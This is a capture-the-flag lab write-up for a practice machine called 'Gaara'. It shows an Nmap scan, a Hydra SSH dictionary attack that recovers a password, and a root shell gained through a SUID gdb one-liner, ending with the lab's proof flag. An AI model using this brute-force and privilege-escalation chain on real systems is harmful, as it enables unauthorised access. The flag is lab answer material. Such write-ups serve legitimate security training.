# Gaara

First, we conduct an Nmap scan:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sS -sV -Pn -p- 192.168.118.142
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2026-07-24 11:35 EDT
Nmap scan report for 192.168.118.142
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 28.42 seconds
```

After visiting the webpage, we can see an image with the caption "Gaara":

![alt text](../../assets/Gaara1.png)

We can try to conduct a dictionary attack on the SSH server using the `hydra` utility with the potential username "gaara" and the `rockyou.txt` wordlist:

```
┌──(kali㉿kali)-[~]
└─$ hydra -l gaara -P rockyou.txt ssh://192.168.187.142                        
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2026-07-25 04:33:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.187.142:22/
[22][ssh] host: 192.168.187.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) finished at 2026-07-25 04:34:13
```

We successfully found a valid password. Now we can log into the server over SSH:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh gaara@192.168.187.142
The authenticity of host '192.168.187.142 (192.168.187.142)' can't be established.
ED25519 key fingerprint is SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:128: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.187.142' (ED25519) to the list of known hosts.
gaara@192.168.187.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ whoami
gaara
gaara@Gaara:~$ hostname
Gaara
gaara@Gaara:~$ 
```

Now we can proceed to privilege escalation. To do so, we can try listing binaries with the SUID bit set:

```
gaara@Gaara:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
gaara@Gaara:/$
```

We can see the `gdb` binary listed in the results. After checking https://gtfobins.org/gtfobins/gdb/, we can see that we can easily abuse it for privilege escalation by running Python code:

```
gaara@Gaara:/$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later [http://gnu.org/licenses/gpl.html](http://gnu.org/licenses/gpl.html)
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
[http://www.gnu.org/software/gdb/bugs/](http://www.gnu.org/software/gdb/bugs/).
Find the GDB manual and other documentation resources online at:
    [http://www.gnu.org/software/gdb/documentation/](http://www.gnu.org/software/gdb/documentation/).

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
# hostname
Gaara
# ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
# cd /root
# ls
proof.txt  root.txt
# cat proof.txt
f8090aab5ef16c37e79ca7f84cd89067
# 
```